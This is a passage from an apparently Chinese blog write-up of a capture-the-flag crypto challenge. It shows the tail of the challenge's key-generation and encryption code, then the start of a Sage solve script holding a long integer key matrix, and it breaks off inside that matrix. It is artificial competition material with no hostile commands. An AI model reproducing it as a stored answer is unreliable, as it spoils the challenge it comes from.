class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    P = <span class="number">2048</span></span><br><span class="line">    row = <span class="number">66</span></span><br><span class="line">    key = Cyber_key(<span class="built_in">len</span>(flag))</span><br><span class="line">    c = Punk_enc(key, flag)</span><br><span class="line">    <span class="built_in">print</span>(key)</span><br><span class="line">    <span class="built_in">print</span>(c)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line">P = <span class="number">2048</span></span><br><span class="line">key = [[<span class="number">505</span>, <span class="number">469</span>, <span class="number">528</span>, <span class="number">1798</span>, <span class="number">373</span>, <span class="number">987</span>, <span class="number">981</span>, <span class="number">438</span>, <span class="number">1438</span>, <span class="number">1918</span>, <span class="number">768</span>, <span class="number">980</span>, <span class="number">720</span>, <span class="number">336</span>, <span class="number">1763</span>, <span class="number">585</span>, <span class="number">1582</span>, <span class="number">1020</span>, <span class="number">601</span>, <span class="number">1543</span>, <span class="number">1374</span>, <span class="number">1904</span>, <span class="number">340</span>, <span class="number">326</span>, <span class="number">947</span>, <span class="number">639</span>, <span class="number">1143</span>, <span class="number">371</span>, <span class="number">359</span>, <span class="number">953</span>, <span class="number">74</span>, <span class="number">657</span>, <span class="number">13</span>, <span class="number">359</span>, <span class="number">280</span>, <span class="number">1903</span>, <span class="number">687</span>, <span class="number">371</span>, <span class="number">114</span>, <span class="number">1232</span>, <span class="number">1573</span>, <span class="number">743</span>], [<span class="number">1310</span>, <span class="number">205</span>, <span class="number">491</span>, <span class="number">137</span>, <span class="number">1743</span>, <span class="number">1185</span>, <span class="number">74</span>, <span class="number">1797</span>, <span class="number">867</span>, <span class="number">755</span>, <span class="number">967</span>, <span class="number">454</span>, <span class="number">800</span>, <span class="number">568</span>, <span class="number">625</span>, <span class="number">492</span>, <span class="number">1835</span>, <span class="number">1586</span>, <span class="number">1462</span>, <span class="number">619</span>, <span class="number">760</span>, <span class="number">1144</span>, <span class="number">98</span>, <span class="number">1764</span>, <span class="number">1356</span>, <span class="number">991</span>, <span class="number">1392</span>, <span class="number">816</span>, <span class="number">849</span>, <span class="number">259</span>, <span class="number">1305</span>, <span class="number">842</span>, <span class="number">1250</span>, <span class="number">1983</span>, <span class="number">1339</span>, <span class="number">752</span>, <span class="number">1170</span>, <span class="number">1976</span>, <span class="number">958</span>, <span class="number">1710</span>, <span class="number">1216</span>, <span class="number">1927</span>], [<span class="number">1507</span>, <span class="number">1699</span>, <span class="number">1536</span>, <span class="number">1708</span>, <span class="number">739</span>, <span class="number">902</span>, <span class="number">1169</span>, <span class="number">1352</span>, <span class="number">886</span>, <span class="number">680</span>, <span class="number">1400</span>, <span class="number">1011</span>, <span class="number">132</span>, <span class="number">1561</span>, <span class="number">1001</span>, <span class="number">772</span>, <span class="number">1809</span>, <span class="number">208</span>, <span class="number">1161</span>, <span class="number">1691</span>, <span class="number">2015</span>, <span class="number">1099</span>, <span class="number">166</span>, <span class="number">1571</span>, <span class="number">551</span>, <span class="number">847</span>, <span class="number">663</span>, <span class="number">749</span>, <span class="number">1634</span>, <span class="number">1487</span>, <span class="number">960</span>, <span class="number">1675</span>, <span class="number">1017</span>, <span class="number">109</span>, <span class="number">63</span>, <span class="number">1714</span>, <span class="number">1540</span>, <span class="number">1515</span>, <span class="number">1382</span>, <span class="number">1569</span>, <span class="number">851</span>, <span class="number">985</span>], [<span class="number">451</span>, <span class="number">1919</span>, <span class="number">680</span>, <span class="number">76</span>, <span class="number">707</span>, <span class="number">1283</span>, <span class="number">933</span>, <span class="number">658</span>, <span class="number">945</span>, <span class="number">1801</span>, <span class="number">352</span>, <span class="number">673</span>, <span class="number">1072</span>, <span class="number">48</span>, <span class="number">1994</span>, <span class="number">1923</span>, <span class="number">1685</span>, <span class="number">1684</span>, <span class="number">1374</span>, <span class="number">28</span>, <span class="number">1774</span>, <span class="number">1769</span>, <span class="number">1388</span>, <span class="number">1541</span>, <span class="number">604</span>, <span class="number">107</span>, <span class="number">1290</span>, <span class="number">787</span>, <span class="number">1622</span>, <span class="number">711</span>, <span class="number">323</span>, <span class="number">1846</span>, <span class="number">317</span>, <span class="number">1519</span>, <span class="number">1426</span>, <span class="number">123</span>, <span class="number">2015</span>, <span class="number">861</span>, <span class="number">544</span>, <span class="number">1401</span>, <span class="number">1869</span>, <span class="number">1833</span>], [<span class="number">862</span>, <span class="number">1316</span>, <span class="number">393</span>, <span class="number">1190</span>, <span class="number">2012</span>, <span class="number">687</span>, <span class="number">78</span>, <span class="number">61</span>, <span class="number">1391</span>, <span class="number">1238</span>, <span class="number">1282</span>, <span class="number">866</span>, <span class="number">1385</span>, <span class="number">1200</span>, <span class="number">292</span>, <span class="number">1702</span>, <span class="number">1599</span>, <span class="number">712</span>, <span class="number">1108</span>, <span class="number">653</span>, <span class="number">1711</span>, <span class="number">745</span>, <span class="number">100</span>, <span class="number">275</span>, <span class="number">322</span>, <span class="number">1671</span>, <span class="number">1723</span>, <span class="number">895</span>, <span class="number">661</span>, <span class="number">1726</span>, <span class="number">497</span>, <span class="number">342</span>, <span class="number">1010</span>, <span class="number">47</span>, <span class="number">1204</span>, <span class="number">1911</span>, <span class="number">1734</span>, <span class="number">1567</span>, <span class="number">1892</span>, <span class="number">954</span>, <span class="number">386</span>, <span class="number">1996</span>], [<span class="number">1333</span>, <span class="number">1928</span>, <span class="number">191</span>, <span class="number">1502</span>, <span class="number">1106</span>, <span class="number">579</span>, <span class="number">779</span>, <span class="number">512</span>, <span class="number">313</span>, <span class="number">308</span>, <span class="number">1277</span>, <span class="number">1547</span>, <span class="number">1814</span>, <span class="number">1434</span>, <span class="number">1867</span>, <span class="number">670</span>, <span class="number">543</span>, <span class="number">404</span>, <span class="number">1570</span>, <span class="number">179</span>, <span class="number">555</span>, <span class="number">1896</span>, <span class="number">289</span>, <span class="number">492</span>, <span class="number">1874</span>, <span class="number">1190</span>, <span class="number">1885</span>, <span class="number">748</span>, <span class="number">1375</span>, <span class="number">401</span>, <span class="number">1685</span>, <span class="number">618</span>, <span class="number">1614</span>, <span class="number">288</span>, <span class="number">2017</span>, <span class="number">571</span>, <span class="number">670</span>, <span class="number">873</span>, <span class="number">98</span>, <span class="number">563</span>, <span class="number">180</span>, <span class="number">749</span>], [<span class="number">262</span>, <span class="number">1072</span>, <span class="number">1188</span>, <span class="number">864</span>, <span class="number">960</span>, <span class="number">1069</span>, <span class="number">1931</span>, <span class="number">870</span>, <span class="number">573</span>, <span class="number">44</span>, <span class="number">38</span>, <span class="number">1525</span>, <span class="number">41</span>, <span class="number">1197</span>, <span class="number">1618</span>, <span class="number">857</span>, <span class="number">187</span>, <span class="number">804</span>, <span class="number">1828</span>, <span class="number">1525</span>, <span class="number">96</span>, <span class="number">204</span>, <span class="number">1565</span>, <span class="number">419</span>, <span class="number">1397</span>, <span class="number">1487</span>, <span class="number">1902</span>, <span class="number">1150</span>, <span class="number">650</span>, <span class="number">1562</span>, <span class="number">151</span>, <span class="number">564</span>, <span class="number">1836</span>, <span class="number">826</span>, <span class="number">95</span>, <span class="number">158</span>, <span class="number">495</span>, <span class="number">1357</span>, <span class="number">2005</span>, <span class="number">819</span>, <span class="number">783</span>, <span class="number">880</span>], [<span class="number">636</span>, <span class="number">985</span>, <span class="number">809</span>, <span class="number">1165</span>, <span class="number">1478</span>, <span class="number">998</span>, <span class="number">408</span>, <span class="number">1897</span>, <span class="number">988</span>, <span class="number">421</span>, <span class="number">743</span>, <span class="number">1210</span>, <span class="number">1128</span>, <span class="number">1901</span>, <span class="number">943</span>, <span class="number">512</span>, <span class="number">1587</span>, <span class="number">1784</span>, <span class="number">911</span>, <span class="number">857</span>, <span class="number">434</span>, <span class="number">367</span>, <span class="number">1345</span>, <span class="number">104</span>, <span class="number">143</span>, <span class="number">357</span>, <span class="number">426</span>, <span class="number">1169</span>, <span class="number">1876</span>, <span class="number">1111</span>, <span class="number">1355</span>, <span class="number">371</span>, <span class="number">219</span>, <span class="number">1056</span>, <span class="number">432</span>, <span class="number">780</span>, <span class="number">1798</span>, <span class="number">151</span>, <span class="number">210</span>, <span class="number">1293</span>, <span class="number">807</span>, <span class="number">620</span>], [<span class="number">29</span>, <span class="number">440</span>, <span class="number">1323</span>, <span class="number">1960</span>, <span class="number">1791</span>, <span class="number">1084</span>, <span class="number">777</span>, <span class="number">1314</span>, <span class="number">709</span>, <span class="number">1014</span>, <span class="number">1721</span>, <span class="number">108</span>, <span class="number">3</span>, <span class="number">961</span>, <span class="number">1253</span>, <span class="number">245</span>, <span class="number">862</span>, <span class="number">1899</span>, <span class="number">1519</span>, <span class="number">563</span>, <span class="number">347</span>, <span class="number">870</span>, <span class="number">820</span>, <span class="number">1787</span>, <span class="number">1323</span>, <span class="number">1113</span>, <span class="number">150</span>, <span class="number">1108</span>, <span class="number">1547</span>, <span class="number">1438</span>, <span class="number">845</span>, <span class="number">788</span>, <span class="number">1221</span>, <span class="number">1680</span>, <span class="number">795</span>, <span class="number">923</span>, <span class="number">1308</span>, <span class="number">1114</span>, <span class="number">153</span>, <span class="number">1985</span>, <span class="number">573</span>, <span class="number">132</span>], [<span class="number">1979</span>, <span class="number">1831</span>, <span class="number">1374</span>, <span class="number">601</span>, <span class="number">1736</span>, <span class="number">1778</span>, <span class="number">1390</span>, <span class="number">138</span>, <span class="number">1295</span>, <span class="number">1582</span>, <span class="number">1777</span>, <span class="number">362</span>, <span class="number">647</span>, <span class="number">753</span>, <span class="number">627</span>, <span class="number">142</span>, <span class="number">1732</span>, <span class="number">994</span>, <span class="number">1911</span>, <span class="number">227</span>, <span class="number">1069</span>, <span class="number">1943</span>, <span class="number">1206</span>, <span class="number">1266</span>, <span class="number">1605</span>, <span class="number">827</span>, <span class="number">1153</span>, <span class="number">1375</span>, <span class="number">486</span>, <span class="number">1222</span>, <span class="number">1938</span>, <span class="number">794</span>, <span class="number">909</span>, <span class="number">629</span>, <span class="number">1232</span>, <span class="number">756</span>, <span class="number">935</span>, <span class="number">1374</span>, <span class="number">1148</span>, <span class="number">1312</span>, <span class="number">584</span>, <span class="number">901</span>], [<span class="number">631</span>, <span class="number">136</span>, <span class="number">1835</span>, <span class="number">686</span>, <span class="number">1779</span>, <span class="number">1298</span>, <span class="number">1471</span>, <span class="number">1009</span>, <span class="number">107</span>, <span class="number">906</span>, <span class="number">4</span>, <span class="number">201</span>, <span class="number">859</span>, <span class="number">1808</span>, <span class="number">1743</span>, <span class="number">1286</span>, <span class="number">305</span>, <span class="number">266</span>, <span class="number">1374</span>, <span class="number">992</span>, <span class="number">531</span>, <span class="number">389</span>, <span class="number">1482</span>, <span class="number">362</span>, <span class="number">873</span>, <span class="number">533</span>, <span class="number">341</span>, <span class="number">1357</span>, <span class="number">85</span>, <span class="number">424</span>, <span class="number">207</span>, <span class="number">995</span>, <span class="number">275</span>, <span class="number">857</span>, <span class="number">1239</span>, <span class="number">770</span>, <span class="number">1355</span>, <span class="number">516</span>, <span class="number">178</span>, <span class="number">1560</span>, <span class="number">228</span>, <span class="number">1843</span>], [<span class="number">1863</span>, <span class="number">1423</span>, <span class="number">786</span>, <span class="number">209</span>, <span class="number">1565</span>, <span class="number">1735</span>, <span class="number">1662</span>, <span class="number">1571</span>, <span class="number">749</span>, <span class="number">326</span>, <span class="number">1258</span>, <span class="number">1099</span>, <span class="number">1780</span>, <span class="number">1240</span>, <span class="number">865</span>, <span class="number">810</span>, <span class="number">7</span>, <span class="number">301</span>, <span class="number">1926</span>, <span class="number">692</span>, <span class="number">67</span>, <span class="number">978</span>, <span class="number">1172</span>, <span class="number">641</span>, <span class="number">839</span>, <span class="number">505</span>, <span class="number">1106</span>, <span class="number">423</span>, <span class="number">827</span>, <span class="number">1838</span>, <span class="number">388</span>, <span class="number">1749</span>, <span class="number">483</span>, <span class="number">880</span>, <span class="number">454</span>, <span class="number">773</span>, <span class="number">1961</span>, <span class="number">1153</span>, <span class="number">858</span>, <span class="number">963</span>, <span class="number">92</span>, <span class="number">829</span>], [<span class="number">2009</span>, <span class="number">66</span>, <span class="number">520</span>, <span class="number">1027</span>, <span class="number">1804</span>, <span class="number">882</span>, <span class="number">42</span>, <span class="number">1826</span>, <span class="number">1732</span>, <span class="number">1093</span>, <span class="number">78</span>, <span class="number">1826</span>, <span class="number">1948</span>, <span class="number">734</span>, <span class="number">1486</span>, <span class="number">1285</span>, <span class="number">28</span>, <span class="number">1092</span>, <span class="number">174</span>, <span class="number">292</span>, <span class="number">1412</span>, <span class="number">24</span>, <span class="number">1454</span>, <span class="number">1015</span>, <span class="number">1560</span>, <span class="number">1154</span>, <span class="number">1168</span>, <span class="number">704</span>, <span class="number">1224</span>, <span class="number">1422</span>, <span class="number">784</span>, <span class="number">1353</span>, <span class="number">799</span>, <span class="number">1591</span>, <span class="number">613</span>, <span class="number">1318</span>, <span class="number">1623</span>, <span class="number">1151</span>, <span class="number">968</span>, <span class="number">297</span>, <span class="number">953</span>, <span class="number">1178</span>], [<span class="number">1889</span>, <span class="number">727</span>, <span class="number">1189</span>, <span class="number">160</span>, <span class="number">1198</span>, <span class="number">1338</span>, <span class="number">970</span>, <span class="number">168</span>, <span class="number">1737</span>, <span class="number">1356</span>, <span class="number">1525</span>, <span class="number">590</span>, <span class="number">1773</span>, <span class="number">1397</span>, <span class="number">105</span>, <span class="number">1368</span>, <span class="number">401</span>, <span class="number">1569</span>, <span class="number">287</span>, <span class="number">1757</span>, <span class="number">801</span>, <span class="number">1818</span>, <span class="number">309</span>, <span class="number">1416</span>, <span class="number">1721</span>, <span class="number">1403</span>, <span class="number">1086</span>, <span class="number">583</span>, <span class="number">1203</span>, <span class="number">172</span>, <span class="number">1030</span>, <span class="number">647</span>, <span class="number">1497</span>, <span class="number">1222</span>, <span class="number">1581</span>, <span class="number">432</span>, <span class="number">1199</span>, <span class="number">1279</span>, <span class="number">5</span>, <span class="number">570</span>, <span class="number">556</span>, <span class="number">1936</span>], [<span class="number">1514</span>, <span class="number">1162</span>, <span class="number">130</span>, <span class="number">1023</span>, <span class="number">538</span>, <span class="number">1772</span>, <span class="number">1525</span>, <span class="number">1709</span>, <span class="number">774</span>, <span class="number">1904</span>, <span class="number">1489</span>, <span class="number">837</span>, <span class="number">742</span>, <span class="number">797</span>, <span class="number">446</span>, <span class="number">1240</span>, <span class="number">847</span>, <span class="number">624</span>, <span class="number">1629</span>, <span class="number">2011</span>, <span class="number">867</span>, <span class="number">1097</span>, <span class="number">1814</span>, <span class="number">231</span>, <span class="number">381</span>, <span class="number">46</span>, <span class="number">363</span>, <span class="number">1560</span>, <span class="number">786</span>, <span class="number">1706</span>, <span class="number">800</span>, <span class="number">112</span>, <span class="number">748</span>, <span class="number">745</span>, <span class="number">407</span>, <span class="number">1290</span>, <span class="number">1093</span>, <span class="number">1268</span>, <span class="number">1536</span>, <span class="number">129</span>, <span class="number">1632</span>, <span class="number">1200</span>], [<span class="number">698</span>, <span class="number">1238</span>, <span class="number">1100</span>, <span class="number">591</span>, <span class="number">1166</span>, <span class="number">1320</span>, <span class="number">620</span>, <span class="number">1044</span>, <span class="number">984</span>, <span class="number">744</span>, <span class="number">453</span>, <span class="number">1927</span>, <span class="number">1019</span>, <span class="number">1488</span>, <span class="number">1586</span>, <span class="number">1428</span>, <span class="number">412</span>, <span class="number">42</span>, <span class="number">776</span>, <span class="number">548</span>, <span class="number">2006</span>, <span class="number">409</span>, <span class="number">1767</span>, <span class="number">506</span>, <span class="number">1153</span>, <span class="number">1398</span>, <span class="number">391</span>, <span class="number">1597</span>, <span class="number">1794</span>, <span class="number">1203</span>, <span class="number">1034</span>, <span class="number">180</span>, <span class="number">433</span>, <span class="number">989</span>, <span class="number">1308</span>, <span class="number">1342</span>, <span class="number">1041</span>, <span class="number">1461</span>, <span class="number">782</span>, <span class="number">1284</span>, <span class="number">225</span>, <span class="number">492</span>], [<span class="number">342</span>, <span class="number">15</span>, <span class="number">324</span>, <span class="number">551</span>, <span class="number">329</span>, <span class="number">1427</span>, <span class="number">186</span>, <span class="number">932</span>, <span class="number">774</span>, <span class="number">275</span>, <span class="number">311</span>, <span class="number">1562</span>, <span class="number">1557</span>, <span class="number">455</span>, <span class="number">329</span>, <span class="number">66</span>, <span class="number">0</span>, <span class="number">856</span>, <span class="number">792</span>, <span class="number">849</span>, <span class="number">878</span>, <span class="number">1362</span>, <span class="number">304</span>, <span class="number">1004</span>, <span class="number">1093</span>, <span class="number">1768</span>, <span class="number">793</span>, <span class="number">366</span>, <span class="number">965</span>, <span class="number">932</span>, <span class="number">1548</span>, <span class="number">759</span>, <span class="number">990</span>, <span class="number">1033</span>, <span class="number">720</span>, <span class="number">1344</span>, <span class="number">1438</span>, <span class="number">481</span>, <span class="number">1546</span>, <span class="number">985</span>, <span class="number">51</span>, <span class="number">1915</span>], [<span class="number">1737</span>, <span class="number">1934</span>, <span class="number">1414</span>, <span class="number">131</span>, <span class="number">1328</span>, <span class="number">919</span>, <span class="number">569</span>, <span class="number">1731</span>, <span class="number">1771</span>, <span class="number">43</span>, <span class="number">1622</span>, <span class="number">322</span>, <span class="number">2000</span>, <span class="number">1918</span>, <span class="number">384</span>, <span class="number">995</span>, <span class="number">1282</span>, <span class="number">1380</span>, <span class="number">449</span>, <span class="number">1566</span>, <span class="number">1981</span>, <span class="number">286</span>, <span class="number">981</span>, <span class="number">704</span>, <span class="number">640</span>, <span class="number">551</span>, <span class="number">5</span>, <span class="number">1019</span>, <span class="number">598</span>, <span class="number">1079</span>, <span class="number">1150</span>, <span class="number">209</span>, <span class="number">464</span>, <span class="number">1555</span>, <span class="number">2</span>, <span class="number">1988</span>, <span class="number">1305</span>, <span class="number">127</span>, <span class="number">152</span>, <span class="number">701</span>, <span class="number">553</span>, <span class="number">1030</span>], [<span class="number">817</span>, <span class="number">176</span>, <span class="number">737</span>, <span class="number">657</span>, <span class="number">1507</span>, <span class="number">514</span>, <span class="number">1453</span>, <span class="number">1656</span>, <span class="number">1229</span>, <span class="number">315</span>, <span class="number">368</span>, <span class="number">332</span>, <span class="number">460</span>, <span class="number">933</span>, <span class="number">1553</span>, <span class="number">1409</span>, <span class="number">1137</span>, <span class="number">1910</span>, <span class="number">209</span>, <span class="number">1906</span>, <span class="number">1487</span>, <span class="number">571</span>, <span class="number">996</span>, <span class="number">1489</span>, <span class="number">2011</span>, <span class="number">245</span>, <span class="number">1510</span>, <span class="number">115</span>, <span class="number">1155</span>, <span class="number">349</span>, <span class="number">67</span>, <span class="number">620</span>, <span class="number">759</span>, <span class="number">699</span>, <span class="number">1034</span>, <span class="number">1030</span>, <span class="number">984</span>, <span class="number">70</span>, <span class="number">1585</span>, <span class="number">1580</span>, <span class="number">121</span>, <span class="number">2</span>], [<span class="number">526</span>, <span class="number">1875</span>, <span class="number">273</span>, <span class="number">1552</span>, <span class="number">641</span>, <span class="number">532</span>, <span class="number">613</span>, <span class="number">1092</span>, <span class="number">72</span>, <span class="number">1518</span>, <span class="number">600</span>, <span class="number">1380</span>, <span class="number">1088</span>, <span class="number">1371</span>, <span class="number">143</span>, <span class="number">1764</span>, <span class="number">1695</span>, <span class="number">1747</span>, <span class="number">1693</span>, <span class="number">2006</span>, <span class="number">614</span>, <span class="number">305</span>, <span class="number">1784</span>, <span class="number">1474</span>, <span class="number">1761</span>, <span class="number">730</span>, <span class="number">1968</span>, <span class="number">1803</span>, <span class="number">520</span>, <span class="number">917</span>, <span class="number">1976</span>, <span class="number">838</span>, <span class="number">525</span>, <span class="number">1769</span>, <span class="number">2005</span>, <span class="number">1625</span>, <span class="number">128</span>, <span class="number">728</span>, <span class="number">1729</span>, <span class="number">440</span>, <span class="number">288</span>, <span class="number">1530</span>], [<span class="number">17</span>, <span class="number">1580</span>, <span class="number">403</span>, <span class="number">1813</span>, <span class="number">1514</span>, <span class="number">1603</span>, <span class="number">559</span>, <span class="number">1845</span>, <span class="number">408</span>, <span class="number">1942</span>, <span class="number">966</span>, <span class="number">1393</span>, <span class="number">544</span>, <span class="number">272</span>, <span class="number">1400</span>, <span class="number">1940</span>, <span class="number">412</span>, <span class="number">1968</span>, <span class="number">837</span>, <span class="number">945</span>, <span class="number">503</span>, <span class="number">409</span>, <span class="number">154</span>, <span class="number">264</span>, <span class="number">379</span>, <span class="number">218</span>, <span class="number">1847</span>, <span class="number">966</span>, <span class="number">1103</span>, <span class="number">125</span>, <span class="number">1935</span>, <span class="number">1381</span>, <span class="number">1552</span>, <span class="number">126</span>, <span class="number">1379</span>, <span class="number">397</span>, <span class="number">735</span>, <span class="number">1165</span>, <span class="number">162</span>, <span class="number">1696</span>, <span class="number">44</span>, <span class="number">238</span>], [<span class="number">1401</span>, <span class="number">75</span>, <span class="number">99</span>, <span class="number">633</span>, <span class="number">922</span>, <span class="number">1093</span>, <span class="number">831</span>, <span class="number">1422</span>, <span class="number">1489</span>, <span class="number">46</span>, <span class="number">728</span>, <span class="number">1191</span>, <span class="number">292</span>, <span class="number">473</span>, <span class="number">640</span>, <span class="number">423</span>, <span class="number">766</span>, <span class="number">1991</span>, <span class="number">1561</span>, <span class="number">1897</span>, <span class="number">583</span>, <span class="number">385</span>, <span class="number">409</span>, <span class="number">1814</span>, <span class="number">1684</span>, <span class="number">879</span>, <span class="number">1414</span>, <span class="number">160</span>, <span class="number">1870</span>, <span class="number">577</span>, <span class="number">1394</span>, <span class="number">1088</span>, <span class="number">1248</span>, <span class="number">1425</span>, <span class="number">405</span>, <span class="number">1726</span>, <span class="number">77</span>, <span class="number">726</span>, <span class="number">1070</span>, <span class="number">642</span>, <span class="number">935</span>, <span class="number">1105</span>], [<span class="number">1156</span>, <span class="number">765</span>, <span class="number">913</span>, <span class="number">323</span>, <span class="number">888</span>, <span class="number">727</span>, <span class="number">1826</span>, <span class="number">744</span>, <span class="number">54</span>, <span class="number">1009</span>, <span class="number">1790</span>, <span class="number">185</span>, <span class="number">1498</span>, <span class="number">1599</span>, <span class="number">1069</span>, <span class="number">62</span>, <span class="number">59</span>, <span class="number">32</span>, <span class="number">1280</span>, <span class="number">274</span>, <span class="number">728</span>, <span class="number">1831</span>, <span class="number">1879</span>, <span class="number">175</span>, <span class="number">708</span>, <span class="number">1466</span>, <span class="number">589</span>, <span class="number">263</span>, <span class="number">707</span>, <span class="number">1542</span>, <span class="number">1790</span>, <span class="number">1816</span>, <span class="number">1854</span>, <span class="number">992</span>, <span class="number">1402</span>, <span class="number">1354</span>, <span class="number">1501</span>, <span class="number">1200</span>, <span class="number">1653</span>, <span class="number">1067</span>, <span class="number">1756</span>, <span class="number">573</span>], [<span class="number">645</span>, <span class="number">378</span>, <span class="number">356</span>, <span class="number">1474</span>, <span class="number">837</span>, <span class="number">1664</span>, <span class="number">45</span>, <span class="number">259</span>, <span class="number">289</span>, <span class="number">231</span>, <span class="number">1640</span>, <span class="number">244</span>, <span class="number">1864</span>, <span class="number">1022</span>, <span class="number">741</span>, <span class="number">1741</span>, <span class="number">1594</span>, <span class="number">1353</span>, <span class="number">991</span>, <span class="number">2002</span>, <span class="number">1969</span>, <span class="number">1522</span>, <span class="number">1852</span>, <span class="number">1031</span>, <span class="number">1296</span>, <span class="number">347</span>, <span class="number">1005</span>, <span class="number">1506</span>, <span class="number">760</span>, <span class="number">630</span>, <span class="number">462</span>, <span class="number">1302</span>, <span class="number">454</span>, <span class="number">466</span>, <span class="number">163</span>, <span class="number">488</span>, <span class="number">1239</span>, <span class="number">1554</span>, <span class="number">1482</span>, <span class="number">1918</span>, <span class="number">1394</span>, <span class="number">1244</span>], [<span class="number">199</span>, <span class="number">1336</span>, <span class="number">969</span>, <span class="number">526</span>, <span class="number">2009</span>, <span class="number">801</span>, <span class="number">1762</span>, <span class="number">1185</span>, <span class="number">645</span>, <span class="number">1577</span>, <span class="number">1303</span>, <span class="number">707</span>, <span class="number">1731</span>, <span class="number">1212</span>, <span class="number">341</span>, <span class="number">121</span>, <span class="number">1984</span>, <span class="number">1108</span>, <span class="number">1794</span>, <span class="number">1078</span>, <span class="number">404</span>, <span class="number">248</span>, <span class="number">36</span>, <span class="number">42</span>, <span class="number">1757</span>, <span class="number">1051</span>, <span class="number">1485</span>, <span class="number">1542</span>, <span class="number">442</span>, <span class="number">666</span>, <span class="number">1596</span>, <span class="number">335</span>, <span class="number">1527</span>, <span class="number">1707</span>, <span class="number">1035</span>, <span class="number">1924</span>, <span class="number">386</span>, <span class="number">1566</span>, <span class="number">1509</span>, <span class="number">998</span>, <span class="number">977</span>, <span class="number">328</span>], [<span class="number">1802</span>, <span class="number">1664</span>, <span class="number">1315</span>, <span class="number">607</span>, <span class="number">95</span>, <span class="number">477</span>, <span class="number">1534</span>, <span class="number">834</span>, <span class="number">1199</span>, <span class="number">1330</span>, <span class="number">738</span>, <span class="number">1339</span>, <span class="number">1313</span>, <span class="number">294</span>, <span class="number">1860</span>, <span class="number">1693</span>, <span class="number">2014</span>, <span class="number">1663</span>, <span class="number">549</span>, <span class="number">298</span>, <span class="number">1076</span>, <span class="number">618</span>, <span class="number">59</span>, <span class="number">749</span>, <span class="number">995</span>, <span class="number">1369</span>, <span class="number">558</span>, <span class="number">1703</span>, <span class="number">656</span>, <span class="number">1745</span>, <span class="number">1813</span>, <span class="number">1428</span>, <span class="number">612</span>, <span class="number">12</span>, <span class="number">624</span>, <span class="number">111</span>, <span class="number">850</span>, <span class="number">456</span>, <span class="number">596</span>, <span class="number">817</span>, <span class="number">383</span>, <span class="number">630</span>], [<span class="number">221</span>, <span class="number">207</span>, <span class="number">1253</span>, <span class="number">1353</span>, <span class="number">992</span>, <span class="number">1732</span>, <span class="number">1038</span>, <span class="number">325</span>, <span class="number">1696</span>, <span class="number">662</span>, <span class="number">771</span>, <span class="number">1437</span>, <span class="number">1616</span>, <span class="number">396</span>, <span class="number">1568</span>, <span class="number">476</span>, <span class="number">232</span>, <span class="number">220</span>, <span class="number">1945</span>, <span class="number">1500</span>, <span class="number">1865</span>, <span class="number">1477</span>, <span class="number">1540</span>, <span class="number">1608</span>, <span class="number">823</span>, <span class="number">255</span>, <span class="number">342</span>, <span class="number">1912</span>, <span class="number">733</span>, <span class="number">1450</span>, <span class="number">1600</span>, <span class="number">1838</span>, <span class="number">69</span>, <span class="number">32</span>, <span class="number">1392</span>, <span class="number">1647</span>, <span class="number">820</span>, <span class="number">492</span>, <span class="number">1479</span>, <span class="number">1172</span>, <span class="number">993</span>, <span class="number">1412</span>], [<span class="number">1207</span>, <span class="number">930</span>, <span class="number">69</span>, <span class="number">289</span>, <span class="number">1770</span>, <span class="number">162</span>, <span class="number">1442</span>, <span class="number">1071</span>, <span class="number">1598</span>, <span class="number">1900</span>, <span class="number">1409</span>, <span class="number">433</span>, <span class="number">1248</span>, <span class="number">1668</span>, <span class="number">314</span>, <span class="number">1201</span>, <span class="number">425</span>, <span class="number">334</span>, <span class="number">1373</span>, <span class="number">789</span>, <span class="number">975</span>, <span class="number">177</span>, <span class="number">1526</span>, <span class="number">49</span>, <span class="number">29</span>, <span class="number">174</span>, <span class="number">885</span>, <span class="number">264</span>, <span class="number">437</span>, <span class="number">287</span>, <span class="number">167</span>, <span class="number">1332</span>, <span class="number">1870</span>, <span class="number">1330</span>, <span class="number">1789</span>, <span class="number">372</span>, <span class="number">140</span>, <span class="number">1697</span>, <span class="number">1018</span>, <span class="number">642</span>, <span class="number">1894</span>, <span class="number">1829</span>], [<span class="number">1710</span>, <span class="number">1301</span>, <span class="number">511</span>, <span class="number">1837</span>, <span class="number">116</span>, <span class="number">1749</span>, <span class="number">1727</span>, <span class="number">1479</span>, <span class="number">950</span>, <span class="number">951</span>, <span class="number">1104</span>, <span class="number">866</span>, <span class="number">838</span>, <span class="number">1248</span>, <span class="number">911</span>, <span class="number">988</span>, <span class="number">1275</span>, <span class="number">637</span>, <span class="number">1636</span>, <span class="number">250</span>, <span class="number">1603</span>, <span class="number">1783</span>, <span class="number">1821</span>, <span class="number">149</span>, <span class="number">388</span>, <span class="number">1474</span>, <span class="number">1366</span>, <span class="number">1788</span>, <span class="number">1038</span>, <span class="number">4</span>, <span class="number">201</span>, <span class="number">1003</span>, <span class="number">1246</span>, <span class="number">1914</span>, <span class="number">233</span>, <span class="number">1625</span>, <span class="number">1041</span>, <span class="number">1979</span>, <span class="number">649</span>, <span class="number">665</span>, <span class="number">1381</span>, <span class="number">1522</span>], [<span class="number">855</span>, <span class="number">35</span>, <span class="number">317</span>, <span class="number">97</span>, <span class="number">400</span>, <span class="number">800</span>, <span class="number">107</span>, <span class="number">91</span>, <span class="number">1444</span>, <span class="number">1063</span>, <span class="number">552</span>, <span class="number">1363</span>, <span class="number">600</span>, <span class="number">767</span>, <span class="number">1313</span>, <span class="number">1117</span>, <span class="number">769</span>, <span class="number">541</span>, <span class="number">1466</span>, <span class="number">848</span>, <span class="number">935</span>, <span class="number">1918</span>, <span class="number">555</span>, <span class="number">1218</span>, <span class="number">1750</span>, <span class="number">1953</span>, <span class="number">1103</span>, <span class="number">1969</span>, <span class="number">1289</span>, <span class="number">634</span>, <span class="number">1310</span>, <span class="number">182</span>, <span class="number">1071</span>, <span class="number">1959</span>, <span class="number">544</span>, <span class="number">462</span>, <span class="number">377</span>, <span class="number">1696</span>, <span class="number">1597</span>, <span class="number">1936</span>, <span class="number">1285</span>, <span class="number">367</span>], [<span class="number">598</span>, <span class="number">1990</span>, <span class="number">750</span>, <span class="number">584</span>, 